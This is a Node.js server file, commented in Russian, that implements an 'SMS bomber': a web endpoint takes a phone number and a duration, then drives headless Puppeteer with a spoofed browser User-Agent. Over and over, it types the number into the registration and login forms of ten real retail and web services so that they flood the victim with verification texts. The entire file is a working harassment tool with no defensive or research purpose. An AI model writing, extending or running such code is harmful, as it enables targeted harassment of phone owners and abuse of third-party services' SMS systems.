const express = require('express');
const axios = require('axios');
const puppeteer = require('puppeteer');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Список сервисов с реальными действиями
const smsServices = [
  {
    name: 'Avito',
    url: 'https://www.avito.ru/registration',
    action: async (page, phone) => {
      await page.goto('https://www.avito.ru/registration');
      await page.waitForSelector('input[data-marker="phone-field/input"]');
      await page.type('input[data-marker="phone-field/input"]', phone);
      await page.click('button[data-marker="phone-field/submit-button"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'Yandex',
    url: 'https://passport.yandex.ru/registration',
    action: async (page, phone) => {
      await page.goto('https://passport.yandex.ru/registration');
      await page.waitForSelector('#phone');
      await page.type('#phone', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'Wildberries',
    url: 'https://www.wildberries.ru/security/login',
    action: async (page, phone) => {
      await page.goto('https://www.wildberries.ru/security/login');
      await page.waitForSelector('input[type="tel"]');
      await page.type('input[type="tel"]', phone);
      await page.click('button#requestCode');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'OZON',
    url: 'https://www.ozon.ru/registration',
    action: async (page, phone) => {
      await page.goto('https://www.ozon.ru/registration');
      await page.waitForSelector('input[type="tel"]');
      await page.type('input[type="tel"]', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'DNS',
    url: 'https://www.dns-shop.ru/auth/register/',
    action: async (page, phone) => {
      await page.goto('https://www.dns-shop.ru/auth/register/');
      await page.waitForSelector('input[name="phone"]');
      await page.type('input[name="phone"]', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'MVideo',
    url: 'https://www.mvideo.ru/login',
    action: async (page, phone) => {
      await page.goto('https://www.mvideo.ru/login');
      await page.waitForSelector('input[data-placeholder="Телефон"]');
      await page.type('input[data-placeholder="Телефон"]', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'AliExpress',
    url: 'https://login.aliexpress.com/',
    action: async (page, phone) => {
      await page.goto('https://login.aliexpress.com/');
      await page.waitForSelector('#phone-number');
      await page.type('#phone-number', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'Citilink',
    url: 'https://www.citilink.ru/registration/',
    action: async (page, phone) => {
      await page.goto('https://www.citilink.ru/registration/');
      await page.waitForSelector('input[name="phone"]');
      await page.type('input[name="phone"]', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'Eldorado',
    url: 'https://www.eldorado.ru/register/',
    action: async (page, phone) => {
      await page.goto('https://www.eldorado.ru/register/');
      await page.waitForSelector('input[data-qa="el-phone-input"]');
      await page.type('input[data-qa="el-phone-input"]', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  },
  {
    name: 'SberMegaMarket',
    url: 'https://sbermegamarket.ru/auth/register/',
    action: async (page, phone) => {
      await page.goto('https://sbermegamarket.ru/auth/register/');
      await page.waitForSelector('input[name="phone"]');
      await page.type('input[name="phone"]', phone);
      await page.click('button[type="submit"]');
      await page.waitForTimeout(3000);
    }
  }
];

let activeBrowsers = new Set();

// Маршрут для запуска бомбера
app.post('/start-bomber', async (req, res) => {
  const { phone, minutes } = req.body;
  
  try {
    const browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    activeBrowsers.add(browser);
    
    let sentCount = 0;
    let failedCount = 0;
    const endTime = Date.now() + minutes * 60 * 1000;

    // Функция отправки через один сервис
    const sendServiceSMS = async (service) => {
      const page = await browser.newPage();
      
      // Настраиваем User-Agent и другие заголовки
      await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
      await page.setViewport({ width: 1920, height: 1080 });
      
      try {
        console.log(`🔄 Запуск ${service.name} для номера ${phone}`);
        await service.action(page, phone);
        sentCount++;
        console.log(`✅ ${service.name}: SMS запрос отправлен`);
        await page.close();
        return { service: service.name, status: 'success' };
      } catch (error) {
        failedCount++;
        console.log(`❌ ${service.name}: ${error.message}`);
        await page.close();
        return { service: service.name, status: 'error', error: error.message };
      }
    };

    // Функция массовой отправки
    const sendMassSMS = async () => {
      if (Date.now() > endTime) {
        return;
      }

      console.log(`📨 Начало массовой рассылки...`);
      
      for (const service of smsServices) {
        if (Date.now() > endTime) break;
        
        try {
          await sendServiceSMS(service);
          // Пауза между сервисами
          await new Promise(resolve => setTimeout(resolve, 2000));
        } catch (error) {
          console.log(`💥 Критическая ошибка в ${service.name}:`, error);
        }
      }
    };

    // Запускаем рассылку каждые 10 минут
    const intervalId = setInterval(sendMassSMS, 10 * 60 * 1000);
    
    // Первая отправка сразу
    sendMassSMS();
    
    // Останавливаем по времени
    setTimeout(async () => {
      clearInterval(intervalId);
      await browser.close();
      activeBrowsers.delete(browser);
      console.log(`⏹️ Бомбер остановлен. Успешно: ${sentCount}, Ошибок: ${failedCount}`);
    }, minutes * 60 * 1000);

    res.json({ 
      success: true, 
      message: `Бомбер запущен на номер ${phone} на ${minutes} минут`,
      totalServices: smsServices.length,
      interval: '10 минут',
      estimatedMessages: Math.floor(minutes / 10 * smsServices.length)
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Маршрут для остановки бомбера
app.post('/stop-bomber', async (req, res) => {
  try {
    for (const browser of activeBrowsers) {
      await browser.close();
    }
    activeBrowsers.clear();
    res.json({ success: true, message: 'Все процессы бомбера остановлены' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`Сервер запущен на порту ${port}`);
  console.log(`Доступно ${smsServices.length} сервисов для рассылки`);
});